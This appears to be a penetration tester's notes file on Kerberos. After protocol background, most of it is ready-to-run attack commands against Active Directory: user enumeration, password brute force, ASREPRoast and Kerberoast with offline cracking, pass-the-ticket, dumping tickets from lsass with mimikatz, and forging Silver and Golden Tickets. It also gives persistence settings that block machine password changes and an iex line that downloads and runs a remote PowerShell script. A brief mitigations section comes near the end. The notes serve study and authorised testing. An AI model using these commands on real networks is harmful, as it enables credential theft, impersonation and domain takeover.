Kerberos
	(krb5)


	--ticket-based mutual-authentication protocol primarily intended for client-server model
		"provides a means of verifying the identities of principals on an open (unprotected) network"
		--without relying on authentication by the host operating system
		--without basing trust on host addresses
		--without requiring physical security of all the hosts on the network
		--under the assumption that packets traveling along the network can be read, modified, and inserted at will
	--based on symmetric key cryptography requiring a third-party trust
		--extends Needham–Schroeder symmetric key protocol
		--optionally implements public key cryptography during phases of authentication
		--third party authentication performed using conventional cryptography
			--viz. shared secret key
default port: UDP 88
	--versions 1-3 occured only internally at MIT
	--Kerberos version 5 appears as RFC 1510 (obsolete)
		https://tools.ietf.org/html/rfc1510
	--Kerberos V5 specification (RFC 4120) obsoletes RFC 1510


Kerberos Protocol:
 User			Service 1	  Service 2				KDC		(Unapproved)
 Machine													Service N
 |---------------|(1)Kerberos Lo|gin---------------->|		 |
 |<------(2)Ticke|t Granting Tic|ket-----------------|		 |
 |-----(3)Request| Forwarded TGT|------------------->|		 |
 |<----(4)Forward|ed TGT Returne|d-------------------|		 |
 |---(5)Request T|icket For Serv|ice 1-------------->|		 |
 |<----(6)Ticket |For Service 1-|------------------->|		 |
 |--(7)Request-->|			   	|		 			 |		 |
 |				 |----(8)Request| Ticket------------>|		 |			(line continued on next..)
 |				 |----(8)For Ser|vice 2------------->|		 |			(..line continued from prev)
 |				 |<-(9)Ticket Fo|r Service 2---------|		 |
 |				 |-(10)Request->|					 |		 |			(line continued on next..)
 |				 |-(10)As User->|					 |		 |			(..line continued from prev)
 |				 |<-(11)Response|					 |		 |
 |<-(12)Response-|				|					 |		 |
----------------------------------------------------------------
 |				 |-(13)Request Ticket For Service N->|		 |
 |				 |<--(14)Ticket For Service N--------|		 |
 |				 |----(15)Request As User------------------->|
 |				 |<------(16)Response------------------------|



Authentication Process:
	1.) client sends a request to the authentication server (AS) requesting "credentials" for a given server
	2.) AS responds with these credentials, encrypted in the client's key
		credentials consist of:
			1) a "ticket" for the server
			2) a temporary encryption key
				"session key"
	3.) client transmits the ticket to the server
		--ticket contains the client's identity and a copy of the session key
			--encrypted in the server's key
		-session key now shared by the client and server
	4.) session key used to authenticate the client and optionally used to authenticate the server
		--session key may also encrypt further communication between the two parties
		--may exchange a separate sub-session key to be used to encrypt further communication

Implementation Consists of:
	--one or more authentication servers running on physically secure hosts
	Authentication Servers
		-maintain a database of principals and their secret keys
			--e.g. users (or clients) and servers
	Code libraries
		-provide encryption and implement the Kerberos protocol
		--order to add authentication to transactions, a typical network application adds one or two calls to Kerberos library
		
Kerberos Protocol consists of:
	--sub-protocols
		"exchanges"
	2 methods by which client can request credentials from Kerberos server:
		1.) client sends a cleartext request for a ticket for the desired server to AS
			reply is sent encrypted in the client's secret key
			--request is for a ticket-granting ticket (TGT) which can later be used with the ticket-granting server (TGS)
		2.) client sends the TGT to the TGS in the same manner as if it were contacting any other application server which requires Kerberos credentials
			reply encrypted in the session key from the TGT
	Obtained Credentials used to:
		a) verify the identity of principals in a transaction
		b) ensure the integrity of messages exchanged between them
		c) preserve privacy of the messages
		--protections implemented determined by individual applications
	--additional information is sent to prove that the message was originated by the principal to whom the ticket was issued
		--timestamp proves that the message was recently generated and is not a replay
		--encrypting the authenticator in the session key proves that it was generated by a party possessing the session key
	--integrity of the messages exchanged between principals can also be guaranteed using the session key
		--session key passed in the ticket and contained in the credentials
		--may provide detection of replay attacks/message stream modification (injection) attacks
		--generates and transmits collision-proof checksum of client message keyed with session key
			--"hash" or "digest"
		
	--modifications to Kerberos Database (auth and validation function require read-only privileges) executed using protocol between client and third Kerberos server: Kerberos Administration Server (KADM)

Kerberos Realms:
	--kbr5 auth designed to operate across organizational boundaries
	--organization wishing to run a Kerberos server establishes its own "realm"
		--name of the realm in which a client is registered is part of the client's name
		--realm name determinate in whether end-service decides to honor requests
			--"inter-realm" key
	--ticket-granting service of each realm registered as a principal in other realm to exchange of inter-realm keys
		--seperate key may be used for each direction
		--client obtains ticket-granting ticket for the remote realm's ticket-granting service from its local realm
	--if an intermediate realm communicates with two remote realms those realms share an inter-realm key
	--realms typically organized heirarchically
		--realms share single with parent and unique key with each seperate child
		--allows authentication path to be constructed where inter-realm key is not directly shared by two realms
		--intermediate realms may be bypassed to achieve cross-realm authentication through alternate authentication paths
			--a field in each ticket contains the names of the realms that were involved in authenticating the client
	
Kerberos Tickets
	PAC (Privilaged Attribute Certificate)
		structure contained in a Kerberos ticket that contains a list of privileges that the ticket is representing
	PAC Validation:
		--service receiving ticket validates information contained in PAC before either issuing service tickets (TGT) or running some command/request/&c (service ticket used)
	"Kerberos V5 does not provide account revocation checking for TGS requests, which allows TGT renewals and service tickets to be issued as long as the TGT is valid even if the account has been revoked...KILE KDCs in the account domain are required to check accounts when the TGT is older than 20 minutes." -MS-KILE specification, 5.1.3
		--if TGT age>20min, PAC contents validated to ensure that account is still valid
			x--20 minute interval when PAC contents ARE NOT validated
			--allows tampering, e.g. forged account/SID information, non-existent user being a member of domain admins group
				--when TGTs can be forged 20 minute rule does not impact exploitation
	Service Tickets:
		--service tickets SHOULD be issued by a TGS after getting a TGT and should be between 2 Kerberos principals
		--portion of TGT sent to TGS needs to be signed by the KRBTGT account
			--for service tickets, the target account is on the computer itself
		--service tickets identical in format to TGT, but with different service name


Kerberos Active Directory implementation
	--default authentication method in Windows 2000 and later
			--AES encrpytion supported since Windows Vista
		--joining a client to a Windows domain entails enabling Kerberos as default authentication protocol between client and services within Windows domain and all domains with trust relationships to that domain (AD Forest)
		x--when either client and/or server are not joined to a domain, or not part of same trusted domain environment, Windows will revert to NTLMv2 hashing for authentication between client and server
	--web applications can enforce Kerberos as an authentication method for domain joined clients by using APIs provided under SSPI (Security Support Provider Interface)
	-NTLM password hash is stored in the Active Directory database on the Domain Controllers for the domain
		-associated hash also stored on host that owns the account
		--linked to computer account object created when linked computer initially joined to AD
	--if a computer account hosts target service, e.g. cifs, associated computer account's credential hash authorizes access to the service




Kerberos Enumeration:
	nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='target'
		https://github.com/PyroTek3/PowerShell-AD-Recon



Attacking Kerberos:
	--partial ecryption of kerberos tickets does not mitigate replay
	+ DoS attacks are not solved with Kerberos
	+ Principals must keep their secret keys secret. If an attacker obtains a principal's key, attacker may masquerade as that principal or impersonate any server to the legitimate principal.
	+ "Password guessing" attacks are not solved by Kerberos
		--offline ("cracking") attacks may decrypte kerberos-encrypted messages
	+ Each host on the network must have a clock which is "loosely synchronized" to the time of the other hosts
		--"looseness" can be configured on a per-server basis
		--clock synchronization protocol (ntp) must itself be secured from network attackers
	+ Principal identifiers recycled on a short-term basis
		--ACLs grant permissions to particular principals
			--if stale ACL entry remains for a deleted principal and principal identifier is reused, new principal will inherit rights specified in the stale ACL entry
		-re-using principal identifiers may allow new principals inadvertant access
	--an attacking *nix host must sync local time with KDC/AD DC to sucessfully attack Kerberos
		Attacks:
		(sorted by required privileges[ascending])
	Kerberos brute-force:
		--Kerberos is an authentication protocol, therefore it is possible to perform brute-force attacks against it
		Advantages to brute forcing Kerberos relative to other auth methods:
			Domain account unnecessary for attacks
				--requires only connectivity to KDC
			Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625)
				--logs to Kerberos pre-authentication failure (4771)
			Partial credential verification (Username Enumeration) possible on failed attempts:
				--Kerberos response indicates if a valid username credential was used in auth request even if the password is wrong
			Possible to discover user accounts without pre-authentication required
				--if found proceed to ASREPRoast
		Disadvantages to brute forcing Kerberos:
			Possible to block (lockout) user accounts
				--requires administrative to re-enable manually
				--likely to be picked up by IDS rulesets
		Kerbrute:
		https://github.com/TarlogicSecurity/kerbrute
			--requires impacket library
		python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
		python kerbrute.py -domain target.local -users users.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile target_pass.txt
		Rubeus
			https://github.com/Zer1t0/Rubeus
		Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
			--brute force attack with list of users
		Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
			--brute force credentials for all users in current domain
	ASREPRoast:
		--ASREPRoast attack looks for users without Kerberos pre-authentication required
			--discover by brute force or preferably OSINT
		--Anyone from any address can send an AS_REQ request to KDC on behalf of any of pre-auth non-requiring users and receive an AS_REP message
			--AS_REP message contains a chunk of data encrypted with the original user key derived from its password
				--password potentially crackable offline using AS_REP messages for valid non-pre-auth-req user accounts
		--Domain account unnecessary to perform ASREPRoast attack, only requires connection to KDC
			--significant decrease in level of difficulty/likelyhood of success with Domain account:
				given a domain account an LDAP query can be used to retrieve users without Kerberos pre-authentication in the domain
				(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
					--LDAP query filter to retrieve Kerberos pre-auth users in AD environment
						--samAccountType 805306368 filters query requests to only respond with only user (not computer, service, &c) accounts
						--userAccountControl 1.2.840.113556.1.4.803:=4194304 filters by Kerberos pre-authentication
		Impacket:
			https://github.com/SecureAuthCorp/impacket
		python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
			--check ASREPRoast for all domain users (credentialed)
		python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
			--check ASREPRoast for a list of users (uncredentialed)
		--will generate output file with encoded AS_REP messages to crack
		Rubeus:
			https://github.com/GhostPack/Rubeus
		rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
			--check ASREPRoast for all users in current domain
		--generates file with one AS_REP per line, can be fed as input to hashcat or john
		Cracking:
			Hashcat:
				hashcat64 -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
				hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
			John:
				john --wordlist=<passwords_file> <AS_REP_responses_file>
				john --wordlist=passwords_kerb.txt hashes.asreproast
	Kerberoast:
		--harvest TGS tickets for services which run on behalf of user accounts in AD
			--not computer accounts
		--part of TGS tickets encrypted with keys derived from user passwords
			--ergo password may be cracked offline
		--only a domain account that can request for TGSs is necessary to perform Kerberoast attack
			--no other privileges required
		(&(samAccountType=805306368)(servicePrincipalName=*))
			--LDAP query filter to retrieve user accounts which have associated services
				--samAccountType 805306368 filters query requests to only respond with only user (not computer, service, &c) accounts
				--servicePrincipalName=* filters by accounts with at least one service
		5 Stages:
			SPN Discovery
			Request Service Tickets
			Export Service Tickets
			Crack Service Tickets
			Rewrite Service Tickets & RAM Injection
		SPN Discovery
			--Services that support Kerberos authentication require to have a Service Principal Name (SPN) associated to point users to the appropriate resource for connection
				--perform via LDAP queries
				--identifies hosts that are running target services
			setspn -T domainname -Q */*
			--services which they have their Canonical-Name to Users should be targeted
				--services bound to a domain user account are more likely to have weak credentials than a computer account
				https://github.com/nidem/kerberoast
			powershell GetUserSPNs.ps1
				https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
			cscript.exe GetUserSPNs.vbs
				https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs
				--query active directory to discover only services that are associated with a user account
				https://github.com/PyroTek3/PowerShell-AD-Recon
			powershell Import-Module Discover-PSMSSQLServers.ps1
			powershell Discover-PSMSExchangeServers
				--discover SPNs associated with specific services only
			powershell Import-Module Find-PSServiceAccounts.ps1
			powershell Find-PSServiceAccounts
				--Enumerate service SPN accounts
				--PasswordLastSet and LastLogon are strong indicators of weak passwords
		Request Service Tickets:
			Add-Type -AssemblyName System.IdentityModel
			New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "COMPUTER_001/WIN-PTELU2U07KG.TARGET.LOCAL:80"
				--request service ticket for specific SPN in Powershell
			klist
				--list all available cached tickets
			klist -f -c
				--check ticket flags in *nix
			mimikatz kerberos::ask /target:COMPUTER_001/WIN-PTELU2U07KG.TARGET.LOCAL:80
				--request service tickets through mimikatz specifying target by service principal name
			Invoke-Mimikatz -Command '"kerberos::list"'
				--list all available cached tickets in mimikatz
			Using non-domain connected host (attacker host):
				https://github.com/SecureAuthCorp/impacket
				https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
				python GetUserSPNs.py -request domain.local/test
				python GetUserSPNs.py target.dom/uname:pw0RdrOwp -outputfile hashes.kerberoast
					-request Kerberos service tickets that belong to domain users
					--requires valid domain credentials in order to interact with the Active Directory
				Identify weak service tickets:
					https://github.com/cyberark/RiskySPN
					Find-PotentiallyCrackableAccounts.ps1 -FullData -Verbose
						-perform an audit on the available service tickets that belong to users
						--evaluates user account and password expiration
						--search for Sensitive + RC4
					Import-Module .\RiskySPNs.psm1
					Find-PotentiallyCrackableAccounts -Domain "domain.local"
					Export-PotentiallyCrackableAccounts
					Get-TGSCipher -SPN "MSSQLSvc/DB.target.dom:1433"
					Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher
					Find-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -Format "Hashcat" | Out-File crack.txt
					hashcat64 -m 13100 crack.txt -a 3
		Export Service Tickets:
			Invoke-Mimikatz -Command '"kerberos::list /export"'
		Crack Service Tickets:
				https://github.com/nidem/kerberoast
			python tgsrepcrack.py /path/to/Seclists/Passwords/Common-Crednetials/10-million-password-list-top-1000000.txt target.kirbi
				https://github.com/leechristensen/tgscrack
			python extractServiceTicketParts.py TARGET.kirbi
			tgscrack -hashfile TARGET.kirbi -wordlist rockyou.txt
			Test Success:
				Enable-PSRemoting
				$pass = 'crack3d' | ConvertTo-SecureString -AsPlainText -Force
				$creds = New-Object System.Management.Automation.PSCredential -ArgumentList 'TARGET', $pass
				Invoke-Command -ScriptBlock {get-process} -ComputerName TARGET.DOMAIN.LOCAL
					--success will retrieve list of running processes
		Rewrite Service Tickets & RAM Injection
			--Kerberos tickets are signed with the NTLM hash of the password
				--if the ticket hash has been cracked, then possible to rewrite tickets
			python kerberoast.py -p pw0rd -r TARGET.kirbi -w DOMAIN.kirbi -u 500
			python kerberoast.py -p pw0rd -r TARGET.kirbi -w DOMAIN.kirbi -g 512
				--impersonate any domain user or a fake account to access service
				--privilege escalation is also possible if user can be added to an elevated group, e.g. Domain Admins
			kerberos::ptt DOMAIN.kirbi
		Simplified:
			Impacket:
					https://github.com/SecureAuthCorp/impacket
			python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
			python GetUserSPNs.py target.dom/uname:pw0RdrOwp -outputfile hashes.kerberoast
			Rubeus:
				https://github.com/GhostPack/Rubeus
			rubeus.exe kerberoast /outfile:<output_TGSs_file>
			rubeus.exe kerberoast /outfile:hashes.kerberoast
			Powershell:
			iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
			Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
			--all example programs output files with one crackable TGS per line
				--useable as input feed for hashcat or john
			Cracking
				Hashcat:
					hashcat64 -m 13100 --force <TGSs_file> <passwords_file>
					hashcat64 -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
					--if a Byte Order Mark (BOM) type error raises a program failure input file likely Unicode-encoded instead of ASCII-encoded
						--covert file enconding with dos2unix (on WIN) or iconv (*nix)
						--only likely to occur if input file was generated on WIN host
				John:
					john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
					john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
						--john will not show usernames alongside cracked passwords
	Pass-The-Key:
		--"Overpass The Hash"
		-Request Kerberos tickets using user NTLM hashes
			--alternative to the common Pass-The-Hash over NTLM protocol
		--useful in networks where NTLM protocol is disabled and only Kerberos is allowed as authentication protocol
		--NTLM hash (or password) of target user account necessary
		--TGT can be requested for accounts for which user hashes have been obtained
		--possible to access any service or machine where the user account has permissions
		Impacket:
			https://github.com/SecureAuthCorp/impacket
		python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
		python getTGT.py target.dom/uname -hashes :2a3fe6fe754eac24c4af3d570f210ba7
			--request TGT with hash
		python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
			--request TGT with aesKey
				--Default encryption used by Kerberos for authentication in Active Directory environments
					--prefered, most evasive method for most AD environments
		python getTGT.py <domain_name>/<user_name>:[password]
			--request TGT with password
		export KRB5CCNAME=<TGT_ccache_file>
			--set TGT as default for further use with impacket
		python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
		python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
		python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
			--impacket remote command execution when granted TGT
		--common Impacket error response: "KDC can’t found the name"
			--likely IP address not recognized by KDC, use hostname instead
		Rubeus+PsExect:
			https://github.com/GhostPack/Rubeus
		rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
			https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
		psexec.exe -accepteula \\<remote_hostname> cmd
	Pass-The-Ticket:
		--ticket itself is stolen and used to authenticate as its owner
		Ticket stored on *nix host:
			From file:
				grep default_ccache_name /etc/krb5.conf
					--check type and location of tickets
				ls -lah /tmp/krb5*
				/tmp/krb5cc_%{uid}
					--default krb ticket store
			From (Gnome) KEYRING:
					https://github.com/TarlogicSecurity/tickey
				cp tickey /tmp/tickey
				/tmp/tickey -i
			From process memory:
			
		Ticket stored on WIN host:
			--tickets are handled and stored by the lsass (Local Security Authority Subsystem Service) process
				--necessary to communicate with lsass to request/retrieve ticket(s)
			--for non-administrative users only owned tickets can be fetched
			--as machine administrator (or SYSTEM) all of tickets on host can be harvested
			--post-injection ticket of user account allows imitating user on remote hosts, but not in localhost, where Kerberos doesn’t apply
			mimikatz:
				mimikatz # sekurlsa::tickets /export
			Rubeus
				rubeus dump | powershell [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))
					--dump base64-encoded Kerberos tickets using Rebues and base64-convert using powershell
				rubeus.exe ptt /ticket:<ticket_kirbi_file>
					--rubeus pass-the-ticket inject ticket
				psexec.exe -accepteula \\<remote_hostname> cmd
		Convert tickets between WIN and *nix formats:
			https://github.com/Zer1t0/ticket_converter
			python ticket_converter.py ticket.kirbi ticket.ccache
			python ticket_converter.py ticket.ccache ticket.kirbi
	Silver Ticket:
		-forged Kerberos Ticket Granting Service (TGS) ticket, "service ticket"
			--Silver Ticket is a forged TGS, therefore requires no communication with a Domain Controller
				--no associated TGT
			--scope is limited to whatever service is targeted on a specific server
			--encrypted/signed by the service account
				-credential extracted from local SAM or service account credential
		--multiple Silver Tickets may be required to access the target service(s)
		--in normal Kerberos operations, the authentication ticket (TGT) is used to request service tickets (TGS) for each Kerberos enabled service
			--Silver Tickets bypass normal process by injecting forged Kerberos TGS tickets directly
		-requires credential hash from from target service
			--if target service running in context of user account, then Service Account's password hash needed to create Silver Ticket
			--else possible to forge tickets using the AES Kerberos keys, which are calculated from the password as well
				--AES keys, unlike NTLM hashse, are salted with the domain and username
		-best vector: crack Service Account password with Kerberoast
		-dump the AD computer account password hash from the system
			Mimikatz:
				mimikatz “privilege::debug” “sekurlsa::logonpasswords” exit
				mimikatz “kerberos::golden /admin:SuperUser /id:1101 /domain:sub.target.dom /sid:S-1-5-21-1473643419-774954089-2222329127 /target:server.sub.target.dom /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
			--requires privileges elevated to local admin privileges (debug access) or SYSTEM access
		Persistence:
			-Domain computer account password change policies aern't strictly encforced by DC
				--Active Directory does not prevent a computer account from accessing AD resources if the computer account password hasn't changed in accordance with policy
			-prevent the computer account password from changing:
				HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1
			-group policy setting “Domain member: Disable machine account password changes” prevents hosts applying this GPO from changing their AD computer account password
			-set domain Group Policy “Domain member: Maximum machine account password age” to "0" (default: "30"), renders AD computer user password unchangeable
			-Domain Controller Group Policy setting “Domain controller: Refuse machine account password changes”
				--Domain Controller will prevent clients updating their computer account password in AD
		Silver Ticket requirements by service name:
			WMI - HOST,RPCSS
			Powershell Remoting - HOST,HTTP(,WSMAN,RPCSS) (OS version-dependent)
			WinRM - HOST,HTTP
			Scheduled Tasks - HOST
			SMB - CIFS
			LDAP (including DCSync) - LDAP
			Windows Remote Serve Administration Tools - RPCSS,LDAP,CIFS
		Silver Ticket CIFS Admin Access
			mimikatz.ps1 kerberos::golden /admin:Supervisor /domain:SUB.TARGET.DOM /id:3030 /sid:S-1-5-21-1234566-5432234516-1236542341 /rc4:<rc4> /service:cifs /ptt
				--create and inject ticket
			copy c:\path\to\mimikatz.ps1 \\host.sub.target.dom\share\
			dir \\host.sub.target.dom\share\
				-After injecting the CIFS Silver Ticket, we can now access any share on the target computer including the c$ share
				--use pseudonym in silver ticket to obfuscate attribution
		Simple Silver Ticket Methods:
			Impacket:
				https://github.com/SecureAuthCorp/impacket
			python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
				--generate TGS with NTLM hash authentication
			python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
				--generate TGS with AES key authentication
			export KRB5CCNAME=<TGS_ccache_file>
				--set TGS as default for further use with impacket using global var
			Mimikatz
				https://github.com/gentilkiwi/mimikatz
			mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
				--generate TGS with NTLM hash authentication
			mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
				--generate TGS with AES 128-bit key
			mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
				--generate TGS with AES 256-bit key
				--Default encryption used by Kerberos for authentication in Active Directory environments
					--prefered, most evasive method for most AD environments
			mimikatz # kerberos::ptt <ticket_kirbi_file>
				--inject TGS with mimikatz
			rubeus.exe ptt /ticket:<ticket_kirbi_file>
				--inject TGS with Rubeus
	Golden Ticket:
		-forged TGT valid for gaining access to any Kerberos service
			--encrypted/signed with the domain Kerberos service account (KRBTGT)
		-TGT is crafted by using the NTLM hash of the krbtgt AD account
			--krbtgt account NTLM hash can be obtained from the lsass process or the NTDS.dit file of any DC in the domain
				--also possible to get that NTLM through a DCsync attack
					Mimikatz lsadump::dcsync module
					Impacket secretsdump.py
		--grants access to any service (or machine) in the domain
			--much more readily discovered behavior that Silver Ticket attacks
		--domain admin privileges or similar required regardless of technique used to attain golden ticket
		--differences relative to Silver Ticket attack:
			krbtgt ntlm hash must be used
			specific service SPN need not be specified
			compromised server is the DC
		Impacket:
			https://github.com/SecureAuthCorp/impacket
		python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
			--generate TGT with NTLM
		python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
			--generate TGT with AES
		export KRB5CCNAME=<TGS_ccache_file>
			--set TGS as default for further use with impacket using global var
		Mimikatz:
			https://github.com/gentilkiwi/mimikatz
		mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
			--generate TGT with NTLM hash authentication
		mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
			--generate TGT with AES 128-bit authentication
		mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
			--generate TGT with AES 256-bit key
		mimikatz # kerberos::ptt <ticket_kirbi_file>
			--inject TGT
		rubeus.exe ptt /ticket:<ticket_kirbi_file>
			--inject TGT with Rubeus
	Mimikatz Golden/Silver Ticket Command Reference:
		--Mimikatz command to create a golden or silver ticket is “kerberos::golden”
			Golden Ticket:
		/domain -FQDN (Fully-Qualified Domain Name)
		/sid -SID of domain
		/user -username to impersonate
		/groups (optional) -group RIDs user is member of (first is primary group) 
			--default: 513,512,520,518,519 for the well-known Administrator’s groups
		/ticket (optional) -path and filename for saving the Golden Ticket file to (for later use)
		/ptt -alternate to /ticket 
			--used to immediately inject forged ticket into memory for use
		/id (optional) -user RID
			--Mimikatz default is 500 (the default Administrator account RID)
		/startoffset (optional) -start offset when ticket is available (set to -10 or 0 if option is used)
			--Mimikatz Default value 0
		/endin (optional) -ticket lifetime
			--Mimikatz Default value 10 years (~5,262,480 minutes)
			--Active Directory default Kerberos policy setting 10 hours (600 minutes)
		/renewmax (optional) -maximum ticket lifetime with renewal
			--Mimikatz Default value 10 years (~5,262,480 minutes)
			--Active Directory default Kerberos policy setting 7 days (10,080 minutes)
			Silver Ticket:
		/target -target server FQDN
		/service -kerberos service running on target server
			--Service Principal Name class (or type), e.g. cifs, http, mssql
		/rc4 -NTLM hash for service (computer account or user account)
			Silver Ticket Default Groups:
				Domain Users SID: S-1-5-21-513
				Domain Admins SID: S-1-5-21-512
				Schema Admins SID: S-1-5-21-518
				Enterprise Admins SID: S-1-5-21-519
				Group Policy Creator Owners SID: S-1-5-21-520

Mitigations:
	Strong password policy
	Avoid accounts without pre-authentication
		--none account must have Kerberos pre-auth enabled
	Do not allow executing services on behalf of user accounts
	Verify PAC
	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters\ValidateKdcPacSignature=1
	Limit password lifespan
		--krbtgt account password must be modified twice to invalidate current domain tickets
		--functional level of domain must be equal or higher than Windows Server 2008 in order to manipulate krbtgt account credentials
	Disable Kerberos weak encryption types
		--only allow AES encryption, disable RC4/NTLM auth accross the domain where possible
	https://www.microsoft.com/en-us/download/details.aspx?id=36036
	

Kerberos Configuration
	/etc/krb5.conf
	http://web.mit.edu/kerberos/krb5-latest/doc/admin/conf_files/krb5_conf.html
kinit user@target.dom
	--test validity of a kerberos configuration



Kerbero-Authenticated Web Applications:
	--works similarly to other SSO solutions, but auth credentials not stored in browser (exclusively) and usually deployed for intranet applications
		--Kerberos implementation able to authenticate with KDC still necessary
	--can be identified by 401 server response with the header “WWW-Authenticate: Negotiate”
		--application may alternatively require ntlm authentication
		--Kerberos Authorization header will always begin with "YII"
		--NTLM Authorization header will always begin with "TlRM"
	
	
	
Glossary:
	Terms:
AS - Authentication Server
	--initial ticket portion of KDC
Authentication header - record containing a Ticket and an Authenticator to be presented to a server as part of the authentication process
Authentication path - sequence of intermediate realms transited in the authentication process when communicating from one realm to another
KADM - Kerberos Administration Server
KDC - Key Distribution Center
	--network service that supplies tickets and temporary session keys
PAC - Privilaged Attribute Certificate
Prinicipal - A uniquely named client or server
Principal identifier - name used to uniquely identify each unique principal
Secret Key - encryption key shared by a principal and the KDC
Session Key - temporary encryption key used between two principals
SPN - Service Pricinpal Name
TGS - Ticket-Granting Server
	--ticket-granting portion of KDC
TGT - Ticket-Granting Ticket
Ticket - record that helps a client authenticate itself to a server, sealed by server's secret key, contains:
	client identity
	session key
	timestamp
	other information
UPN - User Principal Name


	RFC Reference:
Encryption and Checksum Specifications RFC 3961
	https://tools.ietf.org/html/rfc3961
Advanced Encryption Standard (AES) Encryption for Kerberos 5 RFC 3962
New edition of the Kerberos V5 specification "The Kerberos Network Authentication Service (V5)" RFC 4120
	--obsoletes RFC 1510
The Kerberos Version 5 Generic Security Service Application Program Interface (GSS-API) Mechanism: Version 2 RFC 4121
Microsoft Windows 2000 Kerberos Change Password and Set Password Protocols RFC 4757
	--obsoletes RFC 3244
Kerberized Internet Negotiation of Keys (KINK) RFC 4430
 

	Links:
Kerberos: The Network Authentication Protocol
	https://web.mit.edu/Kerberos/

	Tools Listing:
Get-KerberosAESKey.ps1
	https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372
Impacket
	https://github.com/SecureAuthCorp/impacket
	apt-get install python-impacket (kali linux)
	/usr/lib/python2.7/dist-packages/impacket/examples/
Invoke-Mimikatz.ps1
	https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1 (current)
	https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz (old)
kekeo
	https://github.com/gentilkiwi/kekeo
Kerberoast
	https://github.com/nidem/kerberoast
	https://github.com/xan7r/kerberoast
Kerbrute
	https://github.com/ropnop/kerbrute
	https://github.com/TarlogicSecurity/kerbrute
Mimikatz
	https://github.com/gentilkiwi/mimikatz
NeNTLMtoSilverTicket
	https://github.com/NotMedic/NetNTLMtoSilverTicket
Rubeus
	https://github.com/GhostPack/Rubeus
	https://github.com/Zer1t0/Rubeus
		--adds brute force module
Powershell-AD-Recon
	https://github.com/PyroTek3/PowerShell-AD-Recon
PsExec (sysinternals suite)
	https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
pykek
	https://github.com/mubix/pykek
RiskySPN
	https://github.com/cyberark/RiskySPN
SafetyKatz
	https://github.com/GhostPack/SafetyKatz
SharpDPAPI
	https://github.com/GhostPack/SharpDPAPI
SharpRoast
	https://github.com/GhostPack/SharpRoast
tgscrack
	https://github.com/leechristensen/tgscrack
ticket_converter
	https://github.com/Zer1t0/ticket_converter
tickey
	https://github.com/TarlogicSecurity/tickey